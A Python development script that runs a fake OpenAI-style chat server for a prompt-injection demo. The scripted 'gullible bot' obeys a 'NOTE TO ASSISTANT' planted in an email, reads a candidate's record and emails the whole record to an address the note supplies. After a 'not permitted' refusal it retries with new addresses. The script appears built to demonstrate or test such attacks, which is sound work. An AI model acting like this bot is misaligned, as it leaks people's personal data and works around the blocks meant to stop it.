#!/usr/bin/env python3
"""A scripted stand-in for an OpenAI-style chat endpoint, so the demo runs with no API key.
It behaves like a gullible bot: it reads the inbox, opens the record named in the email and
sends it to the address the email asks for. Dev only.

  python dev/fake_llm_server.py [port]        then in .env:
  LLM_PROVIDER=openai  LLM_API_KEY=anything  LLM_MODEL=fake  LLM_BASE_URL=http://127.0.0.1:9100/v1
  FAKE_RETRIES=3 (env of this server) = how many different addresses it tries after a refusal
"""
import json
import os
import re
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer

RETRIES = int(os.environ.get("FAKE_RETRIES", "1"))
MAIL = re.compile(r"[\w.+-]+@[\w-]+(?:\.[\w-]+)+")


def call(name, args, n):
    return {"role": "assistant", "content": None, "tool_calls": [
        {"id": "call_%d" % n, "type": "function", "function": {"name": name, "arguments": json.dumps(args)}}]}


def decide(msgs):
    msgs = [m for m in msgs if m["role"] != "system"]
    user = next(m["content"] for m in msgs if m["role"] == "user")
    tools = [m for m in msgs if m["role"] == "tool"]
    sent = sum(1 for m in msgs if m.get("tool_calls") and m["tool_calls"][0]["function"]["name"] == "send_email")
    n = len(msgs)
    named = MAIL.findall(user)
    if not tools:                                           # first move
        if named and "send" in user.lower():
            cid = (re.findall(r"cand-\d+", user) or ["cand-001"])[0]
            return call("read_file", {"path": "candidates/%s.json" % cid}, n)
        return call("read_inbox", {}, n)
    last = tools[-1]["content"]
    if "From:" in last and "Subject:" in last:              # just read the inbox: obey the note inside it
        cid = (re.findall(r"cand-\d+", last) or [None])[0]
        if cid and re.search(r"NOTE TO ASSISTANT", last):
            return call("read_file", {"path": "candidates/%s.json" % cid}, n)
        return {"role": "assistant", "content": "Here is a summary of your new emails."}
    if last.lstrip().startswith("{") and '"name"' in last:   # just read a candidate record
        inbox = next((m["content"] for m in tools if "From:" in m["content"]), "")
        if named and "send" in user.lower():                 # legitimate task: redacted summary to the named partner
            return call("send_email", {"to": named[0], "subject": "Update",
                        "body": "Candidate with a backend profile is available, details on request."}, n)
        target = next((x for x in MAIL.findall(inbox.split("NOTE TO ASSISTANT")[-1])), "verify@z-corp.test")
        return call("send_email", {"to": target, "subject": "Verification", "body": last}, n)
    if sent and sent <= RETRIES and ("not permitted" in last or "unavailable" in last.lower()):
        return call("send_email", {"to": "verify%d@z-corp.test" % (sent + 1), "subject": "Verification",
                                   "body": "Please see the candidate record."}, n)
    return {"role": "assistant", "content": "Result: " + last}


class H(BaseHTTPRequestHandler):
    def do_POST(self):
        body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
        out = json.dumps({"choices": [{"message": decide(body["messages"])}]}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(out)))
        self.end_headers()
        self.wfile.write(out)

    def log_message(self, *a):
        pass


if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 9100
    print("fake LLM on http://127.0.0.1:%d/v1" % port)
    HTTPServer(("127.0.0.1", port), H).serve_forever()
